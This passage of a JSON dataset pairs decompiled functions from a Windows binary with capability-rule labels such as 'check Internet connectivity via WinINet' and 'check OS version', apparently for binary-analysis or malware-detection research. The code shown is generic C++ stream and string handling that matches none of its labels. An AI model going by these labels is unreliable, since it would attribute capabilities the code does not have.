== 1) {\n            *puVar5 = *puVar3;\n        }\n        else if (in_stack_00000028 != 0) {\n            sub.msvcrt.dll_memcpy(puVar5, puVar3, in_stack_00000028 * 2);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1115
    },
    "1400ae9f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.1400ae9f0(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    char *in_RAX;\n    char *arg1_00;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [8];\n    \n    if (*(arg1 + 0xe8) == 0) {\n        arg2._0_4_ = arg2 | 1;\n    }\n    *(arg1 + 0x20) = arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg2_00 = arg2;\n    if (arg2 == 0) {\n        return in_RAX;\n    }\n    arg1_00 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\n    fcn.14009fa10(arg1_00, arg2_00 + 0xd0);\n    fcn.1400ad170(auStack88, arg2_00, in_R8);\n    fcn.14009fb20(auStack88);\n    fcn.1400ae6e0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.14009fa10(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.14009fb80(piVar1 + 7, in_R8);\n        fcn.14009fb20(auStack88);\n    }\n    return arg1_00;\n}\n",
        "token_count": 380
    },
    "14007370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140073700(int64_t *arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    char acStack40 [8];\n    int64_t *piStack32;\n    \n    fcn.140073e20(acStack40, arg1);\n    if (acStack40[0] != '\\0') {\n        piVar1 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n        if (piVar1[5] < piVar1[6]) {\n            *piVar1[5] = arg2;\n            piVar1[5] = piVar1[5] + 1;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x68))();\n            if (iVar3 == -1) {\n                iVar4 = *(*arg1 + -0x18) + arg1;\n                fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    iVar4 = *(*piStack32 + -0x18);\n    if ((*(piStack32 + iVar4 + 0x19) & 0x20) != 0) {\n        cVar2 = fcn.1400b15e0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piStack32 + iVar4 + 0xe8),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = piStack32 + *(*piStack32 + -0x18);\n                fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 427
    },
    "1400738e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400738e0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    char acStack40 [8];\n    int64_t *piStack32;\n    \n    if (*(arg1 + *(*arg1 + -0x18) + 0xe8) != 0) {\n        fcn.140073e20(acStack40, arg1);\n        if (acStack40[0] != '\\0') {\n            iVar3 = (**(**(arg1 + *(*arg1 + -0x18) + 0xe8) + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(*arg1 + -0x18) + arg1;\n                fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n        iVar4 = *(*piStack32 + -0x18);\n        if ((*(piStack32 + iVar4 + 0x19) & 0x20) != 0) {\n            cVar2 = fcn.1400b15e0();\n            if ((cVar2 == '\\0') && (piVar1 = *(piStack32 + iVar4 + 0xe8),  piVar1 != NULL)) {\n                iVar3 = (**(*piVar1 + 0x30))();\n                if (iVar3 == -1) {\n                    iVar4 = piStack32 + *(*piStack32 + -0x18);\n                    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n                }\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 391
    },
    "1400b06d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b06d0(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    char acStack88 [8];\n    int64_t *piStack80;\n    \n    piVar7 = arg1;\n    fcn.140073e20(acStack88, arg1);\n    if (acStack88[0] == '\\0') goto code_r0x0001400b07c8;\n    iVar4 = *(*arg1 + -0x18);\n    iVar6 = arg1 + iVar4;\n    iVar10 = *(iVar6 + 0x10);\n    if (arg3 < iVar10) {\n        uVar8 = *(iVar6 + 0x18) & 0xb0;\n        if (uVar8 != 0x20) {\n            iVar9 = iVar10 - arg3;\n            if (*(iVar6 + 0xe1) != '\\0') {\n                uVar2 = *(iVar6 + 0xe0);\ncode_r0x0001400b0769:\n                do {\n                    piVar7 = *(arg1 + iVar4 + 0xe8);\n                    if (piVar7[5] < piVar7[6]) {\n                        *piVar7[5] = uVar2;\n                        piVar7[5] = piVar7[5] + 1;\n                    }\n                    else {\n                        iVar3 = (**(*piVar7 + 0x68))();\n                        if (iVar3 == -1) {\n                            iVar6 = *(*arg1 + -0x18) + arg1;\n                            fcn.1400ae9f0(iVar6, *(iVar6 + 0x20) | 1);\n                            iVar6 = *(*arg1 + -0x18) + arg1;\n                            if (*(iVar6 + 0x20) != 0) goto code_r0x0001400b07c0;\n                            goto code_r0x0001400b086f;\n                        }\n                    }\n                    iVar4 = *(*arg1 + -0x18);\n                    iVar9 = iVar9 + -1;\n                } while (iVar9 != 0);\n                iVar6 = arg1 + iVar4;\n                goto code_r0x0001400b0864;\n            }\n            piVar5 = *(iVar6 + 0xf0);\n            if (piVar5 != NULL) {\n                if (*(piVar5 + 7) == '\\0') {\n                    fcn.140025400(piVar5);\n                    uVar2 = 0x20;\n                    if (*(*piVar5 + 0x30) != 0x140025bf0) {\n                        uVar2 = (**(*piVar5 + 0x30))(piVar5);\n                    }\n                }\n                else {\n                    uVar2 = *(piVar5 + 0x59);\n                }\n                *(iVar6 + 0xe0) = uVar2;\n                iVar4 = *arg1;\n                *(iVar6 + 0xe1) = 1;\n                iVar4 = *(iVar4 + -0x18);\n                goto code_r0x0001400b0769;\n            }\ncode_r0x0001400b0a4d:\n            piVar5 = fcn.1400b7000();\n            if (piVar7 == 0x1) {\n                fcn.1400b6670(piVar5);\n                arg1 = arg1 + *(*arg1 + -0x18);\n                piVar5 = arg1;\n                fcn.1400ae6c0(arg1, 1);\n                fcn.1400b6b70();\n            }\n            fcn.1400b6670(piVar5);\n            fcn.1400ae6c0(*(*arg1 + -0x18) + arg1, 1);\n            fcn.1400b6850();\n            goto code_r0x0001400b07c8;\n        }\ncode_r0x0001400b0864:\n        if (*(iVar6 + 0x20) == 0) {\ncode_r0x0001400b086f:\n            iVar4 = (**(**(iVar6 + 0xe8) + 0x60))(*(iVar6 + 0xe8), arg2, arg3);\n            iVar6 = *arg1;\n            if (arg3 != iVar4) {\n                iVar6 = *(iVar6 + -0x18) + arg1;\n                fcn.1400ae9f0(iVar6, *(iVar6 + 0x20) | 1);\n                iVar6 = *arg1;\n            }\n            iVar4 = *(iVar6 + -0x18);\n            iVar6 = arg1 + iVar4;\n            if ((uVar8 == 0x20) && (piVar7 = *(iVar6 + 0x20),  *(iVar6 + 0x20) == 0)) {\n                iVar10 = iVar10 - arg3;\n                if (*(iVar6 + 0xe1) == '\\0') {\n                    piVar5 = *(iVar6 + 0xf0);\n                    if (piVar5 == NULL) {\n                        fcn.1400b7000();\n                        goto code_r0x0001400b0a4d;\n                    }\n                    if (*(piVar5 + 7) == '\\0') {\n                        fcn.140025400(piVar5);\n                        uVar2 = 0x20;\n                        if (*(*piVar5 + 0x30) != 0x140025bf0) {\n                            uVar2 = (**(*piVar5 + 0x30))(piVar5);\n                        }\n                    }\n                    else {\n                        uVar2 = *(piVar5 + 0x59);\n                    }\n                    *(iVar6 + 0xe0) = uVar2;\n                    iVar4 = *arg1;\n                    *(iVar6 + 0xe1) = 1;\n                    iVar4 = *(iVar4 + -0x18);\n                }\n                else {\n                    uVar2 = *(iVar6 + 0xe0);\n                }\n                do {\n                    piVar7 = *(arg1 + iVar4 + 0xe8);\n                    if (piVar7[5] < piVar7[6]) {\n                        *piVar7[5] = uVar2;\n                        piVar7[5] = piVar7[5] + 1;\n                    }\n                    else {\n                        iVar3 = (**(*piVar7 + 0x68))();\n                        if (iVar3 == -1) {\n                            iVar6 = *(*arg1 + -0x18) + arg1;\n                            fcn.1400ae9f0(iVar6, *(iVar6 + 0x20) | 1);\n                            goto code_r0x0001400b0848;\n                        }\n                    }\n                    iVar4 = *(*arg1 + -0x18);\n                    iVar10 = iVar10 + -1;\n                } while (iVar10 != 0);\n                iVar6 = arg1 + iVar4;\n            }\n        }\n    }\n    else {\n        iVar4 = (**(**(iVar6 + 0xe8) + 0x60))(*(iVar6 + 0xe8), arg2, arg3);\n        iVar6 = *(*arg1 + -0x18) + arg1;\n        if (arg3 != iVar4) {\n            fcn.1400ae9f0(iVar6, *(iVar6 + 0x20) | 1);\ncode_r0x0001400b0848:\n            *(arg1 + *(*arg1 + -0x18) + 0x10) = 0;\n            goto code_r0x0001400b07c8;\n        }\n    }\ncode_r0x0001400b07c0:\n    *(iVar6 + 0x10) = 0;\ncode_r0x0001400b07c8:\n    iVar6 = *(*piStack80 + -0x18);\n    if (((((*(piStack80 + iVar6 + 0x19) & 0x20) != 0) && (cVar1 = fcn.1400b15e0(),  cVar1 == '\\0')) &&\n        (piVar7 = *(piStack80 + iVar6 + 0xe8),  piVar7 != NULL)) && (iVar3 = (**(*piVar7 + 0x30))(),  iVar3 == -1)) {\n        iVar6 = piStack80 + *(*piStack80 + -0x18);\n        fcn.1400ae9f0(iVar6, *(iVar6 + 0x20) | 1);\n    }\n    return arg1;\n}\n",
        "token_count": 1954
    },
    "14007465": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140074650(int64_t *arg1)\n\n{\n    unkbyte10 Var1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    char cVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    unkbyte10 *in_RDX;\n    int64_t *piVar6;\n    int64_t iVar7;\n    unkbyte10 Stack104;\n    int64_t iStack88;\n    uint64_t uStack80;\n    uchar auStack72 [8];\n    char cStack64;\n    char acStack56 [8];\n    int64_t *piStack48;\n    \n    Var1 = *in_RDX;\n    piVar6 = arg1;\n    fcn.140073e20(acStack56, arg1);\n    if (acStack56[0] == '\\0') goto code_r0x000140074710;\n    iVar7 = *(*arg1 + -0x18) + arg1;\n    piVar4 = *(iVar7 + 0xf8);\n    if (piVar4 == NULL) {\n        fcn.1400b7000();\ncode_r0x0001400747ff:\n        piVar4 = fcn.1400b7000();\n        if (piVar6 == 0x1) {\n            fcn.1400b6670(piVar4);\n            fcn.1400ae6c0(arg1 + *(*arg1 + -0x18), 1);\n            arg1 = fcn.1400b6b70();\n            fcn.140073f20(acStack56);\n            piVar4 = arg1;\n            fcn.14000f000(arg1);\n        }\n        fcn.1400b6670(piVar4);\n        fcn.1400ae6c0(*(*arg1 + -0x18) + arg1, 1);\n        fcn.1400b6850();\n    }\n    else {\n        if (*(iVar7 + 0xe1) == '\\0') {\n            arg1_00 = *(iVar7 + 0xf0);\n            if (arg1_00 == NULL) goto code_r0x0001400747ff;\n            if (*(arg1_00 + 7) == '\\0') {\n                fcn.140025400(arg1_00);\n                iVar5 = 0x20;\n                cVar3 = ' ';\n                if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                    cVar3 = (**(*arg1_00 + 0x30))(arg1_00, 0x20);\n                    iVar5 = cVar3;\n                }\n            }\n            else {\n                cVar3 = *(arg1_00 + 0x59);\n                iVar5 = cVar3;\n            }\n            *(iVar7 + 0xe0) = cVar3;\n            iVar2 = *arg1;\n            *(iVar7 + 0xe1) = 1;\n            iVar7 = *(iVar2 + -0x18) + arg1;\n        }\n        else {\n            iVar5 = *(iVar7 + 0xe0);\n        }\n        iStack88 = *(iVar7 + 0xe8);\n        uStack80 = iStack88 == 0;\n        Stack104 = Var1;\n        (**(*piVar4 + 0x40))(auStack72, piVar4, &iStack88, iVar7, iVar5, &Stack104);\n        if (cStack64 != '\\0') {\n            iVar7 = *(*arg1 + -0x18) + arg1;\n            fcn.1400ae9f0(iVar7, *(iVar7 + 0x20) | 1);\n        }\n    }\ncode_r0x000140074710:\n    iVar7 = *(*piStack48 + -0x18);\n    if ((*(piStack48 + iVar7 + 0x19) & 0x20) != 0) {\n        cVar3 = fcn.1400b15e0();\n        if ((cVar3 == '\\0') && (piVar6 = *(piStack48 + iVar7 + 0xe8),  piVar6 != NULL)) {\n            iVar5 = (**(*piVar6 + 0x30))();\n            if (iVar5 == -1) {\n                iVar7 = *(*piStack48 + -0x18) + piStack48;\n                fcn.1400ae9f0(iVar7, *(iVar7 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1003
    },
    "1400758a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400758a0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if (*(iVar1 + -0x18) == 0) {\n        return;\n    }\n    if (**0x140102a70 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x0001400758ce;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1;\n        goto code_r0x0001400758ce;\n    }\n    fcn.140077920(arg1, 0, 0, 0);\n    iVar1 = *arg1;\ncode_r0x0001400758ce:\n    *(iVar1 + -8) = 0xffffffff;\n    return;\n}\n",
        "token_count": 186
    },
    "14007591": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140075910(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    \n    piVar1 = fcn.140076110(arg1, 0);\n    piVar2 = piVar1 + 3;\n    if (arg1 != 0) {\n        if (arg1 == 1) {\n            *(piVar1 + 3) = arg2;\n        }\n        else {\n            piVar2 = sub.msvcrt.dll_memset(piVar2, arg2, arg1);\n        }\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg1;\n    *(piVar1 + arg1 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 181
    },
    "1400759e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400759e0(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.140076110(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fd8c0;\n    iVar4 = arg2;\n    fcn.1400b7080(0x1400fd8c0);\n    if ((iVar4 == 0) || (puVar3 != NULL)) {\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.140076110(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fd660;\n    iVar5 = iVar4;\n    fcn.1400b7080(0x1400fd660);\n    if ((iVar5 == 0) || (puVar3 != NULL)) {\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.140076110(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fe4e0;\n    iVar4 = iVar5;\n    fcn.1400b7080(0x1400fe4e0);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x1400fea90;\n        iVar5 = iVar4;\n        fcn.1400b7080(0x1400fea90);\n        if ((iVar5 == 0) || (puVar3 != NULL)) {\n            iVar5 = iVar5 - puVar3;\n            piVar1 = fcn.140076110(iVar5, 0);\n            piVar2 = piVar1 + 3;\n            if (iVar5 == 1) {\n                *(piVar1 + 3) = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n            }\n            *(piVar1 + 2) = 0;\n            *piVar1 = iVar5;\n            *(piVar1 + iVar5 + 0x18) = 0;\n            return piVar2;\n        }\n        puVar3 = 0x140101340;\n        iVar4 = iVar5;\n        fcn.1400b7080(0x140101340);\n        if ((iVar4 != 0) && (puVar3 == NULL)) {\n            fcn.1400b7080(0x1400fd8c0);\n            return 0x1400fb3a0;\n        }\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.140076110(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.140076110(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 1339
    },
    "140075a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140075a60(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.140076110(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fd660;\n    iVar4 = arg2;\n    fcn.1400b7080(0x1400fd660);\n    if ((iVar4 == 0) || (puVar3 != NULL)) {\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.140076110(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fe4e0;\n    iVar5 = iVar4;\n    fcn.1400b7080(0x1400fe4e0);\n    if ((iVar5 == 0) || (puVar3 != NULL)) {\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.140076110(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fea90;\n    iVar4 = iVar5;\n    fcn.1400b7080(0x1400fea90);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x140101340;\n        iVar5 = iVar4;\n        fcn.1400b7080(0x140101340);\n        if ((iVar5 != 0) && (puVar3 == NULL)) {\n            fcn.1400b7080(0x1400fd8c0);\n            return 0x1400fb3a0;\n        }\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.140076110(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.140076110(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 1121
    },
    "140075ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
